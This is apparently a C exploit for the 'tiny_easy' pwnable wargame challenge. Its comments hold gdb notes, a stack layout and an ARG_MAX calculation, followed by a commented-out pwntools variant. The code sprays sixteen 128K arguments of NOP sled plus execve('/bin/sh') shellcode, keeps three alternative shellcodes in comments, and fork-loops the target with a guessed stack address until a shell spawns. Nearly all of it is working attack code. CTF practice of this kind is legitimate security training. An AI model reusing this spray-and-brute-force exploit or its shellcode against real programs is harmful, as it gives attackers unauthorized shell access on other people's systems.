#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// gcc -m32 -o tiny_easy tiny_easy.c

/**
$vim tiny_easy.script
file tiny_easy
b *0x08048054
r
$gdb -x tiny easy.script

edx = '/hom'
call edx

So we need to control argv[0] > &gadget.
Use execl(path, arg0, arg1, ...) to execute target.

[------------------------------------stack-------------------------------------]
0000| 0xfff972e0 --> 0x1                                                                        <-- argc           <--- \x90\x90\x90...\x90{shellcode}
0004| 0xfff972e4 --> 0xfff983d2 ("/home/bc7/Desktop/tiny_easy")                                 <-- argv[0]
0008| 0xfff972e8 --> 0x0                                                                        <-- argv[1]
0012| 0xfff972ec --> 0xfff983ee ("CLUTTER_IM_MODULE=xim")                                       <-- argv[2]
0016| 0xfff972f0 --> 0xfff98404 ("LS_COLORS=rs=0:di=01; ...)                                    ...
0020| 0xfff972f4 --> 0xfff989f0 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
0024| 0xfff972f8 --> 0xfff98a12 ("XDG_MENU_PREFIX=gnome-")
0028| 0xfff972fc --> 0xfff98a29 ("_=/usr/bin/gdb")                                              <-- argv[n]
[------------------------------------------------------------------------------]

Review the arg limitation in Linux.
The length limitation of one single parameter in argv is PAGE_SIZE*32 = 4K *32 = 128K = 0x20000     (131072)
The length limitation of all of the parameter is `getconf ARG_MAX`
*
tiny_easy@pwnable:~$ getconf ARG_MAX
2097152

\>>> hex(2097152)
'0x200000'
\>>> 0x200000 / 0x20000
16

We can insert at most 16 agrvs with length of 0x20000.

After several checking by gdb, the stack addr is most like 0xff*
**/

char shellcode[] = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
// http://shell-storm.org/shellcode/files/shellcode-585.php

// char shellcode[] = "\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80";
// char shellcode[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
// char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";

int main()
{
    int argc = 130001;
    char arg[argc];
    memset(arg, '\x90', argc-1);
    strcpy(arg + (argc-1) - strlen(shellcode), shellcode);
    
    int status;

    while(1) {
        if(fork()==0)
            execl("/home/tiny_easy/tiny_easy", "\xa0\xf0\xbc\xff",                      // Any guess shellcode addr 0xff* is avaliable.
                  arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,arg,      // 16 params
                  (char*)0);
                  //NULL);
        // p = process(argv=[p32(guess_shellcode_addr)], executable="/home/tiny_easy/tiny_easy", env=env)
        wait(&status);
        if (WIFEXITED(status))      // status=0 -> continue, abnormal exit
            break;
    }
    return 0;
}



// python version cannot be run due to permission

// from * import pwn

// guess_shellcode_addr = 0xff9c3844
// shellcode  = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
// payload = "\x90" * 10000 + shellcode

// # construct payload
// env = {}
// for i in range(1,0x100):
//     env[str(i)] = payload

// while(1):
//     p = process(argv=[p32(guess_shellcode_addr)], executable="/home/tiny_easy/tiny_easy", env=env)
//     p.interactive()